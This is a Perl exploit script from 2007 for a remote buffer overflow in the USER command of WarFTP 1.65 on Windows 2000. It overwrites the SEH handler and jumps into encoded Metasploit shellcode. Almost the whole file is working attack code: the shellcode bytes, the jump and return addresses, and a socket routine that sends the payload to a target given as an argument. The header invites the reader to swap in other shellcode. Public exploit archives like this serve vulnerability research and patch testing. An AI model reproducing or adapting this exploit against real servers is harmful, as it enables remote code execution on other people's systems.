# ===============================================================================================
#                   WarFTP 1.65 (USER) Remote Buffer Overflow SEH overflow Exploit
#                               By Umesh Wanve
# ===============================================================================================
# 
# Date : 15-03-2007
#
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Well I used different technique here. Rather than overwriting EIP, I used SEH handler overwrite 
# method. Preety simple. 
#
# Stack --->      buffer                       ===  AAAAA.........
#                   |
#            Pointer to next SEH               ===  Short Jump to Hellcode  
#                   |
#               SEH Handler                    ===  Pop, Pop, Ret (ws2help.dll win2000 sp4)
#                   |
#                NOP Sled                      ===  Nop Sled
#                   | 
#                Hellcode                      ===  Hell.........
# 
#
#
#
# P.S: This was written for educational purpose. Use it at your own risk.Author will be not be 
#      responsible for any damage.
#  
# Always Thanks to Metasploit. 
#
#==================================================================================================
#!/usr/bin/perl

use IO::Socket;
#use strict;

# win32_exec - EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com 
my($shellcode)=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42".
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32".
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a".
"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c".
"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57".
"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50".
"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d".
"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f".
"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a".
"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76".
"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65".
"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78".
"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f".
"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65".
"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d".
"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31".
"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69".
"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61".
"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70".
"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42";

my($pointer_to_next_seh)="\xeb\x06\x90\x90";                  # Short Jump

my($seh_handler)="\xa9\x11\x02\x75";                          #pop, pop, ret 
                                                              #(ws2help.dll win2000 sp4) 



if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],

PeerPort => "21",


Proto    => "TCP"))
{
                
		     $exploit  = "USER ".                          #Vulnerable Command                          
                             ("A"x485).                        #Buffer 
                             "BBBB".                           #EIP Overwrites here :)
                             ("\x90" x 80).                    #Garbage
				     $pointer_to_next_seh.            
                             $seh_handler.
                             ("\x90" x 10).
                             $shellcode. 				   #ur code	
                             ("\x90" x 10).
                             "\r\n";
                 
		     print $socket $exploit;

                 sleep(1);
			
               
                 close($socket);
}
else
{
                 print "Cannot connect to $ARGV[0]:21\n";
}